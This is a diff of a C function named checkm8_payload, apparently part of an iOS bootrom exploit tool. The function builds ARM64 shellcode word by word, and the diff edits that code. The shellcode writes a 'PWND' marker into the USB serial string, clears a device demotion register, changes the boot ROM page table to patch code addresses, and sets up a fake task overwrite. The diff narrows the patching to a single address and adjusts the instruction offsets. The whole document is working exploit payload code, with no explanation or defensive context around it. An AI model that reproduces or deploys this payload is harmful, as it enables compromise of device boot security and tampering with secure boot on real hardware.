@@ -53,48 +53,42 @@ static int checkm8_payload(io_client_t client)
     int i=0;
     
     // _main:
-    *(uint32_t*)(shc+i) = INSN_NOP;   i+=4; // HACK? mov x19, #0: 0xd2800013
     *(uint32_t*)(shc+i) = 0xa9bf7bfd; i+=4; // stp   x29, x30, [sp, #-0x10]!
     *(uint32_t*)(shc+i) = 0x910003fd; i+=4; // mov   x29, sp
     
-    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldr   x0, =gUSBDescriptors
-    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldp   x0, x1, [x0]
-    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // adr   x2, USB_DESCRIPTOR
-    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldp   x3, x4, [x2]
-    *(uint32_t*)(shc+i) = INSN_NOP; i+=4;   // ldp   x3, x4, [x2, #0x10]
-    *(uint32_t*)(shc+i) = 0x58000900; i+=4; // ldr   x0, =gUSBSerialNumber
+    *(uint32_t*)(shc+i) = 0x58000700; i+=4; // ldr   x0, =gUSBSerialNumber
     
     // _find_zero_loop:
     *(uint32_t*)(shc+i) = 0x91000400; i+=4; // add   x0, x0, #1
     *(uint32_t*)(shc+i) = 0x39400001; i+=4; // ldrb  w1, [x0]
     *(uint32_t*)(shc+i) = 0x35ffffc1; i+=4; // cbnz  w1, _find_zero_loop
-    *(uint32_t*)(shc+i) = 0x100007a1; i+=4; // adr   x1, PWND_STRING
+    *(uint32_t*)(shc+i) = 0x100005e1; i+=4; // adr   x1, PWND_STRING
     *(uint32_t*)(shc+i) = 0xa9400c22; i+=4; // ldp   x2, x3, [x1]
     *(uint32_t*)(shc+i) = 0xa9000c02; i+=4; // stp   x2, x3, [x0]
-    *(uint32_t*)(shc+i) = 0x58000820; i+=4; // ldr   x0, =gUSBSerialNumber
-    *(uint32_t*)(shc+i) = 0x58000841; i+=4; // ldr   x1, =usb_create_string_descriptor
+    *(uint32_t*)(shc+i) = 0x58000620; i+=4; // ldr   x0, =gUSBSerialNumber
+    *(uint32_t*)(shc+i) = 0x58000641; i+=4; // ldr   x1, =usb_create_string_descriptor
     *(uint32_t*)(shc+i) = 0xd63f0020; i+=4; // blr   x1
-    *(uint32_t*)(shc+i) = 0x58000841; i+=4; // ldr   x1, =gUSBSRNMStringDescriptor
+    *(uint32_t*)(shc+i) = 0x58000641; i+=4; // ldr   x1, =gUSBSRNMStringDescriptor
     *(uint32_t*)(shc+i) = 0x39000020; i+=4; // strb  w0, [x1]
     *(uint32_t*)(shc+i) = 0x58000840; i+=4; // ldr   x0, =demote_flag
     *(uint32_t*)(shc+i) = 0xf100041f; i+=4; // cmp   x0, #1
     *(uint32_t*)(shc+i) = 0x54000121; i+=4; // bne   _eclipsa
     
     // _demotion:
-    *(uint32_t*)(shc+i) = 0x58000821; i+=4; // ldr   x1, =gDemotionRegister
+    *(uint32_t*)(shc+i) = 0x58000621; i+=4; // ldr   x1, =gDemotionRegister
     *(uint32_t*)(shc+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
     *(uint32_t*)(shc+i) = 0x7200001f; i+=4; // tst   w0, #1
-    *(uint32_t*)(shc+i) = 0x54000440; i+=4; // beq   _end
+    *(uint32_t*)(shc+i) = 0x54000380; i+=4; // beq   _end
     *(uint32_t*)(shc+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
     *(uint32_t*)(shc+i) = 0x121f7800; i+=4; // and   w0, w0, #0xfffffffe
     *(uint32_t*)(shc+i) = 0xb9000020; i+=4; // str   w0, [x1]
-    *(uint32_t*)(shc+i) = 0x1400001e; i+=4; // b     _end
+    *(uint32_t*)(shc+i) = 0x14000018; i+=4; // b     _end
     
     // _eclipsa:
     *(uint32_t*)(shc+i) = 0xd50343df; i+=4; // msr   daifset, #0x3
     *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
     
-    *(uint32_t*)(shc+i) = 0x58000720; i+=4; // ldr   x0, =VROM_PAGE_TABLE_ADDR
+    *(uint32_t*)(shc+i) = 0x58000520; i+=4; // ldr   x0, =VROM_PAGE_TABLE_ADDR
     *(uint32_t*)(shc+i) = 0xf940000a; i+=4; // ldr   x10, [x0]
     *(uint32_t*)(shc+i) = 0xb24b054a; i+=4; // orr   x10, x10, #0x60000000000000
     *(uint32_t*)(shc+i) = 0x9278f94a; i+=4; // and   x10, x10, #0xffffffffffffff7f
@@ -104,15 +98,9 @@ static int checkm8_payload(io_client_t client)
     *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb   sy
     *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
     
-    *(uint32_t*)(shc+i) = 0x18000649; i+=4; // ldr   w9, =INSN_NOP
-    *(uint32_t*)(shc+i) = 0x58000673; i+=4; // ldr   x19, =PATCH_ADDR_0
-    *(uint32_t*)(shc+i) = 0x58000694; i+=4; // ldr   x20, =PATCH_ADDR_1
-    *(uint32_t*)(shc+i) = 0x580006b5; i+=4; // ldr   x21, =PATCH_ADDR_2
-    *(uint32_t*)(shc+i) = 0x580006d6; i+=4; // ldr   x22, =PATCH_ADDR_3
+    *(uint32_t*)(shc+i) = 0x52ba5009; i+=4; // mov   w9, #0xd2800000
+    *(uint32_t*)(shc+i) = 0x58000433; i+=4; // ldr   x19, =PATCH_ADDR
     *(uint32_t*)(shc+i) = 0xb9000269; i+=4; // str   w9, [x19]
-    *(uint32_t*)(shc+i) = 0xb9000289; i+=4; // str   w9, [x20]
-    *(uint32_t*)(shc+i) = 0xb90002a9; i+=4; // str   w9, [x21]
-    *(uint32_t*)(shc+i) = 0xb90002c9; i+=4; // str   w9, [x22]
     
     *(uint32_t*)(shc+i) = 0x9249f54a; i+=4; // and   x10, x10, #0xff9fffffffffffff
     *(uint32_t*)(shc+i) = 0xb279014a; i+=4; // orr   x10, x10, #0x80
@@ -133,16 +121,6 @@ static int checkm8_payload(io_client_t client)
     *(uint32_t*)(shc+i) = 0xa8c17bfd; i+=4; // ldp  x29, x30, [sp], #0x10
     *(uint32_t*)(shc+i) = 0xd65f03c0; i+=4; // ret
     
-    // USB_DESCRIPTOR:
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
-    
     // PWND_STRING:
     *(uint32_t*)(shc+i) = PWND_STR0;  i+=4;
     *(uint32_t*)(shc+i) = PWND_STR1;  i+=4;
@@ -151,18 +129,13 @@ static int checkm8_payload(io_client_t client)
     *(uint32_t*)(shc+i) = INSN_NOP;   i+=4; // nop
     
     // OFFSETS:
-    *(uint64_t*)(shc+i) = gUSBDescriptors; i+=8;
     *(uint64_t*)(shc+i) = gUSBSerialNumber; i+=8;
     *(uint64_t*)(shc+i) = usb_create_string_descriptor; i+=8;
     *(uint64_t*)(shc+i) = gUSBSRNMStringDescriptor; i+=8;
     *(uint64_t*)(shc+i) = demote_flag; i+=8;
     *(uint64_t*)(shc+i) = gDemotionRegister; i+=8;
     *(uint64_t*)(shc+i) = VROM_PAGE_TABLE_ADDR; i+=8;
-    *(uint64_t*)(shc+i) = INSN2_NOP_NOP; i+=8; // INSN_NOP_NOP
-    *(uint64_t*)(shc+i) = PATCH_ADDR_0; i+=8;
-    *(uint64_t*)(shc+i) = PATCH_ADDR_1; i+=8;
-    *(uint64_t*)(shc+i) = PATCH_ADDR_2; i+=8;
-    *(uint64_t*)(shc+i) = PATCH_ADDR_3; i+=8;
+    *(uint64_t*)(shc+i) = PATCH_ADDR; i+=8;
     
     overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
     overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
